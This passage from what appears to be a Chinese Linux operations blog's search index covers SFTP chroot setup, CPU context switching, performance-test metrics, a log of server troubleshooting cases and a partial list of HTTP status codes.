/home/webapp/.ssh # 此处授权可以直接授权www:www，为了看起来更清晰，此处授权还是用创建时的用户，但无论使用的是那一个，系统显示都会是www $\u003e chown webapp:webapp /home/webapp/.ssh # 密钥创建 $\u003e su - webapp -s /bin/bash -c \"ssh-keygen -f ~/.ssh/id_rsa -t rsa -b 4096 -N ''\" $\u003e su - webapp -s /bin/bash -c \"cat ~/.ssh/id_rsa.pub \u003e ~/.ssh/authorized_keys \u0026\u0026 chmod 600 ~/.ssh/authorized_keys\" 修改/etc/ssh/sshd_config # 注意此项, 网上的sftp搭建教程基本都是说需要将此项切换为, Subsystem sftp internal-sftp # 切换后将绕过\"管理员可能依赖登录shell配置来阻止某些用户登录\"。但我们上述使用的是重复UID，所以此处不能更改 # 若更改，则会导致共用UID的用户之间可相互登陆。 # 差异参见: https://serverfault.com/questions/660160/openssh-difference-between-internal-sftp-and-sftp-server # 差异参见: http://129.226.226.195/post/21921.html Subsystem sftp /usr/libexec/openssh/sftp-server # 指定匹配用户 Match User webapp # 用chroot将用户的根目录指向到固定位置 ChrootDirectory /sftpdir # -l 指定日志收集 -f 收集内容(应该是) internal-sftp 请参看上述连接自行参悟 ForceCommand internal-sftp -l INFO -f AUTH # 以下其他配置自行参悟 PermitTTY no X11Forwarding no AllowTcpForwarding no PasswordAuthentication no 开始测试 # 上述操作完成后，还需要创建一个chroot目录 $\u003e mkdir /sftpdir $\u003e echo hello \u003e /sftpdir/readme.md # 注意目录属主必须为root,属组可以不是，权限不能超过755 $\u003e chown root.root /sftpdir $\u003e chmod 755 /sftpdir # 重启sshd服务(重载也可以) $\u003e systemctl reload sshd ## 登陆测试 $\u003e sftp -i /home/webapp/.ssh/id_rsa webapp@127.0.0.1 The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:hQkISJWcE+gHf1WAT2bIWSwiAJRD81Bv3wZd+1vZOuU. ECDSA key fingerprint is MD5:0e:e5:1a:c7:6c:97:fb:48:95:d2:c9:86:bb:d0:7d:91. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts. Connected to 127.0.0.1. sftp\u003e ls -l -rw-r--r-- 1 0 0 6 Dec 8 06:31 readme.md sftp\u003e pwd Remote working directory: / sftp\u003e 后续 至此，sftp搭建完成, 当然由于 /目录属主为root,sftp目前只能登陆，无法上传，需要在/sftpdir目录下创建目录，然后授权www用户即可，在该目录下进行增、删、改操作。 其他问题 为什么使用sftp: sftp使用加密传输认证信息和传输的数据，相对ftp而言更为安全一点. 目录映射: 虚拟用户实现了，那该如何实现目录映射呢，软连接还是每个目录单独建一个用户？其实都不是，我们只需要借助mount命令的bind属性即可，具体使用方式请自行参悟(http://blog.0x5c0f.cc/2019/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/#mount---bind) 帐号管理: 共UID帐号(webapp)直接删除时候基本都会有提示，如果主帐号www正在使用(如php、nginx)，那么删除的时候就会提示无法删除，此时我们只需要强制删除即可(userdel的-f选项)，并不会影响主帐号和其他帐号(注:这个我只在CentOS 7上进行过测试，理论上所有发行版是一致的) 日志查看: tail -f /var/log/secure ","date":"2022-12-07","objectID":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/:0:0","tags":["linux","解决方案","sftp"],"title":"SFTP搭建","uri":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/"},{"categories":["linux","整理收集"],"content":"Linux性能指标之cpu上下文切换","date":"2022-09-01","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87%E4%B9%8Bcpu%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2/","tags":["linux","解决方案"],"title":"Linux性能指标之cpu上下文切换","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87%E4%B9%8Bcpu%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2/"},{"categories":["linux","整理收集"],"content":" 透过现象看本质 CPU上下文切换 https://blog.csdn.net/qq_34556414/article/details/107094209 CPU上下文切换是保证Linux系统正常工作的一个核心功能，按照不同场景，可以分为进程上下文切换、线程上下文切换和中断上下文切换。究竟怎么分析CPU上下文切换的问题。 过多的上下文切换，会把CPU时间消耗在寄存器、内核栈以及虚拟内存等数据的保存和恢复上，缩短进程真正运行的时间，成了系统性能大幅下降的一个元凶。 既然上下文切换对系统性能影响那么大，到底要怎么査看上下文切换呢？可以使用vmstat这个工具，来查询系统的上下文切换情况。 vmstat是常用的系统性能分析工具，主要用来分析系统的内存使用情况，也常用来分析 CPU 上下文切换和中断的次数。 [root@0x5c0f ~][0]$ vmstat 2 procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 4 0 0 10895260 13356 7206976 0 0 34 24 186 109 4 2 94 0 0 2 0 0 10944452 13356 7179112 0 0 0 14 3414 3917 4 2 94 0 0 0 0 0 10940036 13356 7179008 0 0 0 1404 2930 3534 4 2 95 0 0 0 0 0 10953532 13356 7168816 0 0 0 114 2823 3232 3 2 95 0 0 procs（进程） r：当前运行队列中线程的数目，代表线程处于可运行状态，但CPU还未能执行，这个值可以作为判断CPU是否繁忙的一个指标；当这个值超过了CPU数目，就会出现CPU瓶颈了；这个我们可以结合top命令的负载值同步评估系统性能（等待运行的进程数（(Running or Runnable)是就绪队列的长度，也就是正在运行和等待CPU的进程数）） b：处在非中断睡眠状态的进程数 system（系统）这2个值越大，会看到由内核消耗的CPU时间会越大 in：(interrupt)则是每秒中断的次数，包括时钟中断 cs： (context switch)是每秒上下文切换的次数 cpu（以百分比表示） us：用户进程执行时间(user time)； sy：系统进程执行时间(system time)； id：空闲时间(包括IO等待时间)； wa：等待IO时间；wa的值高时，说明IO等待比较严重，这可能由于磁盘大量作随机访问造成，也有可能磁盘出现瓶颈。 r： 表示运行队列(就是说多少个进程真的分配到CPU)，我测试的服务器目前CPU比较空闲，没什么程序在跑，当这个值超过了CPU数目，就会出现CPU瓶颈了。这个也和top的负载有关系，一般负载超过了3就比较高，超过了5就高，超过了10就不正常了，服务器的状态很危险。top的负载类似每秒的运行队列。如果运行队列过大，表示你的CPU很繁忙，一般会造成CPU使用率很高。 cs：每秒上下文切换次数，例如我们调用系统函数，就要进行上下文切换，线程的切换，也要进程上下文切换，这个值要越小越好，太大了，要考虑调低线程或者进程的数目,例如在apache和nginx这种web服务器中, 我们一般做性能测试时会进行几千并发甚至几万并发的测试，选择web服务器的进程可以由进程或者线程的峰值一直下调，压测，直到cs到一个比较小的值，这个进程和线程数就是比较合适的值了. 系统调用也是，每次调用系统函数，我们的代码就会进入内核空间，导致上下文切换，这个是很耗资源，也要尽量避免频繁调用系统函数。上下文切换次数过多表示你的CPU大部分浪费在上下文切换，导致CPU干正经事的时间少了，CPU没有充分利用，是不可取的。 vmstat只给出了系统总体的上下文切换情况，要想查看每个进程的详细情况，就需要使用pidstat 了。给它加上-w选项，你就可以查看每个进程上下文切换的情况了。 [root@0x5c0f ~][130]$ pidstat -w 5 Linux 5.14.18-100.fc33.x86_64 (0x5c0f) 2022年09月01日 _x86_64_ (8 CPU) 15时54分47秒 UID PID cswch/s nvcswch/s Command 15时54分52秒 0 2 0.20 0.00 kthreadd 15时54分52秒 0 13 0.60 0.00 ksoftirqd/0 15时54分52秒 0 14 91.42 0.00 rcu_sched 15时54分52秒 0 15 0.20 0.00 migration/0 15时54分52秒 0 18 0.20 0.00 migration/1 15时54分52秒 0 19 0.60 0.00 ksoftirqd/1 这个结果中有两列内容是我们的重点关注对象。 一个是cswch,表示每秒自愿上下文切换 (voluntary context switches)的次数，另一个则是nvcswch ,表示每秒非自愿上下文切换 (non voluntary context switches)的次数 所谓自愿上下文切换，是指进程无法获取所需资源，导致的上下文切换。比如说，I/O、内存等系统资源不足时，就会发生自愿上下文切换。 而非自愿上下文切换，则是指进程由于时间片巳到等原因，被系统强制调度，进而发生的上下文切换。比如说，大量进程都在争抢CPU时，就容易发生非自愿上下文切换。 这两列如果数值比较大意味着不同的性能问题: 自愿上下文切换时说明进程在等待资源，有可能发生了I/O等问题 非自愿上下文切换，说明进程在被强制调度，也就是在争抢CPU 中断次数多了，说明CPU在被中断处理程序占用。可以通过/proc/interrupts 查看 ","date":"2022-09-01","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87%E4%B9%8Bcpu%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2/:0:0","tags":["linux","解决方案"],"title":"Linux性能指标之cpu上下文切换","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87%E4%B9%8Bcpu%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2/"},{"categories":["linux","整理收集"],"content":"Linux性能测试之性能测试指标","date":"2022-08-22","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/","tags":["linux","解决方案"],"title":"Linux性能测试之性能测试指标(转载)","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/"},{"categories":["linux","整理收集"],"content":" Linux 性能测试之性能测试指标详解(原文) https://blog.csdn.net/u010521062/article/details/115908166 前言 性能测试指标是衡量系统性能的评价标准，常用的系统性能测试指标包括：响应时间、并发用户/并发、点击率、吞吐量、TPS/QPS、PV/UV；Linux服务器常用的性能指标包括：CPU使用率、内存占用率、磁盘IO、系统平均负载等。 1. 系统性能测试指标 1.1. 响应时间 响应时间是指某个请求或操作从发出到接收到反馈所消耗的时间，包括应用服务器（客户端）处理时间、网络传输时间以及数据库服务器处理时间。比如一个页面从点击/输入到完全加载的时间；完成一次增加、删除、修改或者查询动作的事务响应时间等。 一个请求在网络上的传输往往要经历多个网络节点才能到达目标服务器，我们假设请求经历了三个网络节点的传输时间B1、B2、B3，客户端的处理时间为A，服务器的响应时间为C。则一次请求的完整路径可以描述为下图： graph RL; 服务器C --\u003e|反馈|节点B3--\u003e节点B2--\u003e节点B1--\u003e|反馈|客户端A 客户端A --\u003e|请求| 节点B1--\u003e节点B2--\u003e节点B3--\u003e|请求|服务器C graph RL; 服务器C --\u003e|反馈|节点B3--\u003e节点B2--\u003e节点B1--\u003e|反馈|客户端A 客户端A --\u003e|请求| 节点B1--\u003e节点B2--\u003e节点B3--\u003e|请求|服务器C客户端从发出请求到接收到服务器反馈的完整链路时间为A—\u003eB1—\u003eB2—\u003eB3—\u003eC（节点处理时间都包括接收和发送两个过程）。 则请求的响应时间为： 响应时间=A+B1+B2+B3+C 1.2. 并发 并发是指多个用户在同一时期内进行相同的事务处理或操作。由于用户在进行一系列操作流程时有一定的时间间隔（即用户思考时间）或者服务器处理请求有先后顺序，于是，就产生了绝对并发和相对并发概念的区分。 绝对并发是指同一时刻（即同一时间点）并发用户对服务器同时发送请求。 相对并发是指一段时间内（即同一时间区间）并发用户对服务器发送请求。 举个例子，一个并发量为10000人（可同时容纳10000人）的动物园，这里的并发量是指绝对并发还是相对并发呢？我们很容易理解，这个并发指的是相对并发，因为整个动物园是一个交织的网状结构，出入口、老虎、狮子、大象等各个动物站点都有分流的作用，基本不可能出现出入口或者站点能够同时承载10000人的情况，出入口的并发可能只有200人。 因此这个动物园的例子里，并发量10000是指各个节点的总和，参观者参观动物园有路径的先后顺序，是相对并发的概念。而出入口的并发量是200人，则是指同一时间在出入口能够同时容纳200人，这就是绝对并发的概念。 TODO: 这里缺少一张图 一般来说，在系统的性能测试中，系统或者模块的并发更多是指相对并发，而接口的并发更倾向于绝对并发。并发性能的概念是指系统、模块或接口稳定运行，不抛出异常情况下所能够承载的并发量。 在并发性能测试中常用到并发用户数和并发请求数两个指标。顾名思义，并发用户数是指同一时间（点或区间），系统、模块或接口能够承载的用户数量；并发请求数是指同一时间（点或区间），系统、模块或接口能够承载的请求数量。 1.3. 点击量/点击率 点击量是衡量网站流量的一个指标，也就是点击数clicks，是对网站点击数据的统计。 点击率（Clicks Ratio）也可以叫做点进率（Click-through Rate），它是网站上某一内容被点击的次数与整个网站内容被显示次数之比，即clicks/views。反应了网站上某一页面或内容的受关注程度，经常用来衡量广告的吸引程度。比如公众号的一篇文章被浏览了10w次，文章中的广告链接被点击了2000次，那么这条广告的点击率是2%（2000/100000*100%）。 在性能测试领域，点击率（hit rate）常指单位时间内（每秒钟）页面的点击数，即每秒钟发送的http请求数量，点击率越大对服务器造成的压力也越大，对服务器的性能要求也越高。 有些人容易混淆点击率和点击量的概念，比如我们经常会听到有人说某网站的点击率是多多万，实际上这里的点击率指的是点击量，曝光率或者说页面浏览量。 1.4. 吞吐量/吞吐率 吞吐量是指系统处理客户请求数量的总和，可以指网络上传输数据包的总和，也可以指业务中客户端与服务器交互数据量的总和。 吞吐率是指单位时间内系统处理客户请求的数量，也就是单位时间内的吞吐量。可以从多个维度衡量吞吐率：①业务角度：单位时间（每秒）的请求数或页面数，即请求数/秒或页面数/秒；②网络角度：单位时间（每秒）网络中传输的数据包大小，即字节数/秒等；③系统角度，单位时间内服务器所承受的压力，即系统的负载能力。 吞吐率（或吞吐量）是一种多维度量的性能指标，它与请求处理所消耗的CPU、内存、IO和网络带宽都强相关。 1.5. TPS/QPS TPS（Transaction Per Second）是指单位时间（每秒）系统处理的事务量。事务可以是用户自定义的一系列操作或者动作的集合，比如“用户注册“事务是点击注册按钮，填写用户注册信息，点击提交按钮，以及加载注册成功页面的动作集合。 QPS（Query Per Second）是指单位时间内查询或访问服务器的次数。 TPS和QPS的区别在于一个事务可以包含多次查询或访问服务器，也可以只查询或访问一次服务器。当多次查询或访问时，一个TPS相当于多个QPS；当只查询或访问一次时，一个TPS则等价于一个QPS。 1.6. PV/UV PV和UV是衡量web网站性能容量的两个重要度量指标，经常用在电子商务网站领域中用来衡量网站的活跃度。 PV（Page View）是页面的浏览量或点击量，用户对系统或者网站任何页面的每一次点击或者访问都会被记录一次浏览量或点击量，对相同页面进行多次访问浏览量或点击量也会进行累计。 UV（Unique Vistor）是系统或者网站的独立访客，一段时间内相同客户端（或PC）访问系统或者网站只会被记录一次，连续重复访问或者浏览多个系统页面次数不会进行累计。 PV和UV按照统计周期划分，可以划分为全天PV、每小时PV、全天UV和每小时UV等。在一些数据或交易量非常庞大的场景中，比如双11或618等全民购物活动时，常常还会统计峰值PV和峰值UV。 2. Linux服务器性能指标 2.1. CPU使用率 CPU使用率是单位时间内服务器CPU的使用统计，可以用除CPU空闲时间外其他时间占总CPU时间的百分比来表示，即：CPU使用率=1-CPU空闲时间/总CPU时间 命令：#top //top工具间隔3s会动态滚动更新一次数据 字段 说明 us (user) 用户态的CPU使用时间比例，是用户运行程序的真正时间，它不包括后面的ni时间； sy (system) 内核态的CPU使用时间比例，是操作系统的运行时间，操作系统运行时，用户运行程序往往处于等待状态； ni (nice) 表示低优先级用户态的CPU时间比例，取值范围为[-20,19]，数值越大，则优先级越低； id (idle) 表示空闲的CPU时间比例，值越大，CPU空闲时间比例越高，利用率越低； wa (iowait) 表示处于IO等待状态的CPU时间比例； hi (hard interrupt) 表示处理硬中断的CPU时间比例； si (soft interrupt) 与hi相反，表示处理软中断的CPU时间比例； st (steal) 表示当前系统运行在虚拟机中被其他虚拟机占用的CPU时间比例。 在性能测试中，系统整体的CPU使用率可以用（1-id）来计算。当us很高时，说明CPU时间主要消耗在用户代码上，可以从用户代码角度考虑优化性能；当sy很高时，说明CPU时间主要消耗在内核上，可以从是否系统调用频繁、CPU进程或线程切换频繁角度考虑性能的优化；当wa很高时，说明有进程在进行频繁的IO操作，可能是磁盘IO或者网络IO。 一般情况下，如果%us+%sy\u003c=70%，我们可以认为系统的运行状态良好。 2.2. 内存占用率 Linux的系统内存管理机制遵循内存利用率最大化的原则。内核会将空余的内存划分为cached（不属于free），对于有频繁读取操作的文件或数据会被保存在cached中。因此，对于linux系统来说，可用于分配的内存不止free的内存，同时还包括cached的内存（其实还包括buffers的内存）。 cached和buffers都属于缓存，它们的区别主要在于cached主要用来缓冲频繁读取的文件，它可以直接记忆我们打开的文件内容；而buffers主要用来给块设备做的缓冲大小，只记录文件系统的metadata以及tracking in-flight pages信息，比如存储目录里面的内容，权限等。 top工具既可以查看系统CPU使用情况，也可以查看系统内存使用信息。 命令：#top 在性能测试中，经常会用到系统已用内存、物理已用内存、系统内存占用率以及物理内存占用率这几个指标，它们的计算公式如下： 系统已用内存MemUsed=MemTotal-MemFree //包含buffers和cached 物理已用内存-/+Used= MemTotal-MemFree-MemBuffers-MemCached 系统内存占用率MemUsed%=（MemUsed/ MemTotal）*100% 物理内存占用率-/+Used%=(-/+Used/ MemTotal）*100% 一般情况下，系统内存占用率\u003c=70%，我们可以认为系统的","date":"2022-08-22","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/:0:0","tags":["linux","解决方案"],"title":"Linux性能测试之性能测试指标(转载)","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/"},{"categories":["linux","运维记事"],"content":"服务器运维故障记录","date":"2022-08-01","objectID":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/","tags":["linux","解决方案"],"title":"服务器运维故障记录","uri":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"Mysql Errcode: 24 - Too many open files https://blog.csdn.net/weixin_36343850/article/details/86293700 原因：打开文件数量太多，超出了open_files_limit这个参数的限制，在一个表中有多个分区的时候，这种情况更容易发生。 解决方法： 查看 open_files_limit参数, 使用show variables like '%open%';就可以看到了 修改 open_files_limit参数 在网上找了很多资料，有的说直接在/etc/mysql/mysql.conf.d/mysqld.cnf文件中的[mysqld]部分添加open_files_limit参数，比如open_files_limit=10240，并且在/etc/security/limits.conf 添加mysql soft nofile 10240和mysql hard nofile 10240这两个参数然后重启MySQL，但是发现不能生效。 以下方法可用： 在文件/etc/systemd/system/multi-user.target.wants/mysql.service(也有可能是/etc/systemd/system/mysql.service这个文件)最后添加LimitNOFILE=10240 然后执行systemctl daemon-reload，接着再重启mysql服务sudo service mysql restart,可以看到已经修改成功了 禅道bug管理系统 这个部署遇到的一个坑就是php打死获取不到session的位置 打开调试日志方式是将my.cnf 中debug设置为true 实际错误体现是 ERROR: 您访问的域名 xxx.xxx.xxx 没有对应的公司。 我的解决方案是 代码目录整体权限设置为777,然后删除掉my.cnf进行重装,重装后在目录权限调整为正常权限即可. 安装完成后，首页出现无限循环重定向，手动将my.php中PATH_INFO修改为GET，或在nginx传入变量PATH_INFO值$request_uri; nginx 代理php产生的一些故障 记录一个nginx 代理 php 产生的问题,问题已经解决了,但是似乎还是没有找到根本原因,若有了解的,请一定解惑一二, 以下记录下处理过程 . 问题产生过程: A服务器代码迁移到B机器上,代码是rsync直接同步的,然后B运行的时候就出问题了,根据调试发现,无论访问什么(html/js/css)都会跳转到首页,实际应该是都会经过php解析(我发誓A和B的环境配置是一模一样的!A可以正常运行.), php框架为opencart . 浏览器访问表现以下错误: Resource interpreted as Stylesheet but transferred with MIME type text/html ERR_CONNECTION_REFUSED 处理过程 : 问题实际上是头一天发生的,经过多方调试发现,实际上通过域名访问任何资源均会跳转到首页,访问php资源则会出现无法加载js/css等静态资源全部都是MIME类型问题,nginx强行给css/js等资源设置一个content-type前端也无法识别正确,另外也测试过网上提供的多方解决方案,仍然无法得到解决 . 第二天, 保持原有nginx配置 , 我给对应站点首页的index.php代码中加入了echo 123; exit();进行测试,访问发现可正常断开,此时在访问根下的静态html测试文件,发现可以正常访问了,此时删除echo 123; exit();,重新访问index.php,发现(js/css)静态资源被升级为https访问,此时我给相关域名配置上证书,然后访问就正常了!!! 原因分析: 站点缓存(这个可能性最大),opencart框架实际上session是存储到数据库中的,估计很多的cache也是存于数据中的,而今天解决的时间也恰好距离我最后一次同步一天的样子. nginx 配置域名过多,导致配置混乱. B服务器的nginx实际上已经配置了很多个域名,php解析的SCRIPT_FILENAME 我使用的是$document_root,最后一次修改我也将$document_root修改为了具体的路径,不知道会不会是这个原因产生的. zabbix 自动发现异常错误 具体错误表现 Cannot create item: item with the same key \"domain.status[{#DOMAIN_NAME},http_code]\" already exists. Cannot accurately apply filter: no value received for macro \"{#DOMAINNAME}\". 解决方案 这个是特么的自动发现脚本返回值的key必须用{}括起来,不然你即使是json格式他也不会认, 网上那些这个抄那个的坑货就只知道变量要大写，还有个坑告诉我要使用宏,用了宏就是第二个问题,不用第一个，这我是记得很清楚，宏并不是必定要有的啊，我以前写也基本没有加过。 我特么也是蠢了，写了这么多的自动发现，居然没有注意要括起来。 nginx 伪静态无效问题 具体错误体现 拿到apache的.htaccess文件后，通过https://www.winginx.com/en/htaccess转换为了nginx可用的规则，但加入后访问跳转一直是404,经检查location是定位成功了的，但就是访问不了 解决方案: 后续开发提供了另一个伪静态配置,所有rewrite是放在if指令中(!-e $request_filename)，然后就可以了。我对比了下，两者的差异就是，一个是放在了location中，定位了每一个rewrite所在的位置。还有就是放在if中的rewrite的匹配规则是用引号括起来了的。具体原因暂时还是每搞清楚。后续出现需测试下引号是否有影响. nginx 反向代理后端服务器，部分资源出现502错误 问题描述: 后端是dotnet应用，反向代理时候域名请求页面部分css/js资源返回502错误。直接请求报错的css/js又是正常的，前端绕过nginx直接访问dotnet所有返回又是正常的。只有经过nginx会出现该问题。 解决过程： 网上搜索到很多的解决方案，这一个感觉有点用，但并没有解决我的问题,说的是header过大，超出了默认的1k，就会引发上述的upstream sent too big header，nginx把外部请求给后端处理，后端返回的header太大，nginx处理不过来就会导致502，这个问题提出的解决是，增大proxy_buffer_size/proxy_buffers/proxy_busy_buffers_size,不过还是记录下，毕竟不是每个问题原因都一样。 这是我当时参考的第二个方案,根据官方文档https://nginx.org/en/docs/http/ngx_http_upstream_module.html#keepalive,调整了upstream中keepalive,我原来设置的是2,现调整为16,并设置了Connection \"Keep-Alive\";(这个设置是为了保持http/1.0持久链接，官方不建议使用此参数，但我这边websokcet和http/1.0,单独设置一个并没有效果，所以两个都设置了)。这个方案当时解决了一部分的问题。但根本并未得到解决。 然后最终的方案，重启应用服务器，问题完全解决！！！ 原因分析：突然不知道怎么下笔了，反正就是系统tcp连接过多，最开始体现就是出现大量的CLOSE_WAIT,当时重启了对应占用的程序，清理一些连接，出现一定的好转，但也仅仅出现了好转，后面可能由于某些原因，导致重启应用也无法解决了，最后重启服务器，问题完全解决。 应该不是每个人都是这个原因，不过可以参考下。 nginx 反向代理 cdn回源(多层nginx)出现 502、503、504 等异常 在我的部署模式中，很多时候都是docker与实际应用环境混合部署(多环境，单节点)，大多的结构是 docker运行程序环境，nginx反向代理到docker暴露的端口，从而实现应用的正常访问。我这次遇到的这个问题，最开始的时候我以为是cdn的问题，因为当时我没有通过cdn直达服务器的时候访问都是正常的，然后通过cdn后，页面大多数请求就都出现了502等状态，这个时候我联系了运营商，他们说回源链接被断开了，是不是服务器上有相关安全策略，仔细的想了下，服务器上除了开启了iptables外，并没有其他的安全设置，正没有头绪的时候，突然想到docker需要依赖iptables转发，是不是这个原因导致防火墙又有问题了(因为之前我调整iptables的时候，导致过docker容器无法连接网络😥)，于是我把防火墙一关，然后cdn回源就正常了。 后续的处理，我关闭了服务器防火墙设置，重启了docker，重建了容器(防止容器网络出现问题，同时让docker重新创建自己的规则链)。对外的防火墙采用云防火墙现在公网流入流量。上面其他记录的故障中，估计也有这个原因导致的，但是不知道怎么调好了。(TODO:// 一个人运维好难，有点啥问题都不知道该找谁讨论下，全靠自己摸索) nginx: [emerg] location “” cannot be inside the ","date":"2022-08-01","objectID":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:0:0","tags":["linux","解决方案"],"title":"服务器运维故障记录","uri":"/posts/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","整理收集"],"content":"HTTP响应码/http_code","date":"2022-07-05","objectID":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/","tags":["linux","http"],"title":"HTTP响应码","uri":"/posts/linux/http%E5%93%8D%E5%BA%94%E7%A0%81/"},{"categories":["linux","整理收集"],"content":" HTTP响应码分类 https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status 常见状态码 一些常见HTTP状态码为： 200 – 服务器成功返回网页 404 – 请求的网页不存在 503 – 服务不可用 常见HTTP状态码大全 1xx（临时响应） 表示临时响应并需要请求者继续执行操作的状态代码。 http状态码 说明 100 （继续） 请求者应当继续提出请求。 服务器返回此代码表示已收到请求的第一部分，正在等待其余部分。 101 （切换协议） 请求者已要求服务器切换协议，服务器已确认并准备切换。 102 将继续执行请求 2xx （成功） 表示成功处理了请求的状态代码。 http状态码 说明 200 （成功） 服务器已成功处理了请求。 通常，这表示服务器提供了请求的网页。 201 （已创建） 请求成功并且服务器创建了新的资源。 202 （已接受） 服务器已接受请求，但尚未处理。 203 （非授权信息） 服务器已成功处理了请求，但返回的信息可能来自另一来源。 204 （无内容） 服务器成功处理了请求，但没有返回任何内容。 205 （重置内容） 服务器成功处理了请求，但没有返回任何内容。 206 （部分内容） 服务器成功处理了部分 GET 请求。 207 请求已成功处理，返回了多个状态的XML消息 208 响应已发送 226 已完成响应 3xx （重定向） 表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。 代http状态码码 说明 300 （多种选择） 针对请求，服务器可执行多种操作。 服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。 301 （永久移动） 请求的网页已永久移动到新位置。 服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。 302 （临时移动） 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。 303 （查看其他位置） 请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。 304 （未修改） 自从上次请求后，请求的网页未修改过。 服务器返回此响应时，不会返回网页内容。 305 （使用代理） 请求者只能使用代理访问请求的网页。 如果服务器返回此响应，还表示请求者应使用代理。 307 （临时重定向） 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。 308 （永久转移）这个请求和以后的请求都应该被另一个URI地址重新发送。307、308和302、301有相同的表现，但是不允许HTTP方法改变。例如，请求表单到一个永久转移的资源将会继续顺利地执行。 4xx（请求错误） 这些状态代码表示请求可能出错，妨碍了服务器的处理。 http状态码 说明 400 （错误请求） 服务器不理解请求的语法。 401 （未授权） 需要身份认证验证. 对于需要登录的网页，服务器可能返回此响应。 401.1 未授权：登录失败 401.2 未授权：服务器配置问题导致登录失败 401.3 ACL 禁止访问资源 401.4 未授权：授权被筛选器拒绝 401.5 未授权：ISAPI 或 CGI 授权失败 401.7 访问被 Web 服务器上的 URL 授权策略拒绝。这个错误代码为 IIS 6.0 所专用 403 （禁止） 服务器拒绝请求。对 Internet 服务管理器 的访问仅限于Localhost 403.1 禁止访问：禁止可执行访问 403.2 禁止访问：禁止读访问 403.3 禁止访问：禁止写访问 403.4 禁止访问：要求 SSL 403.5 禁止访问：要求 SSL 128 403.6 禁止访问：IP 地址被拒绝 403.7 禁止访问：要求客户证书 403.8 禁止访问：禁止站点访问 403.9 禁止访问：连接的用户过多 403.1o 禁止访问：配置无效 403.11 禁止访问：密码更改 403.12 禁止访问：映射器拒绝访问 403.13 禁止访问：客户证书已被吊销 403.14 禁止访问：客户访问许可过多 403.15 禁止访问：客户证书不可信或者无效 403.16 禁止访问：客户证书已经到期或者尚未生效 HTTP 404.1 - 403.17 客户端证书已过期或尚未生效。 403.18 在当前的应用程序池中不能执行所请求的 URL。这个错误代码为 IIS 6.0 所专用。 403.19 不能为这个应用程序池中的客户端执行 CGI。这个错误代码为 IIS 6.0 所专用。 404 （未找到） 服务器找不到请求的网页。 404.1 无法在所请求的端口上访问 Web 站点。 404.2 Web 服务扩展锁定策略阻止本请求。 404.3 MIME 映射策略阻止本请求。 405 （方法禁用） 禁用请求中指定的方法。 406 （不接受） 无法使用请求的内容特性响应请求的网页。 407 （需要代理授权） 此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。 408 （请求超时） 服务器等候请求时发生超时。 409 （冲突） 服务器在完成请求时发生冲突。 服务器必须在响应中包含有关冲突的信息。 410 （已删除） 如果请求的资源已永久删除，服务器就会返回此响应。 411 （需要有效长度） 服务器不接受不含有效内容长度标头字段的请求。 412 （未满足前提条件） 服务器未满足请求者在请求中设置的其中一个前提条件。 413 （请求实体过大） 服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。 414 （请求的 URI 过长） 请求的 URI（通常为网址）过长，服务器无法处理。 415 （不支持的媒体类型） 请求的格式不受请求页面的支持。 416 （请求范围不符合要求） 如果页面无法提供请求的范围，则服务器会返回此状态代码。 417 （未满足期望值） 服务器未满足”期望”请求标头字段的要求。 418 （我是一个茶壶）这个代码是在1998年作为传统的IETF April Fools‘ 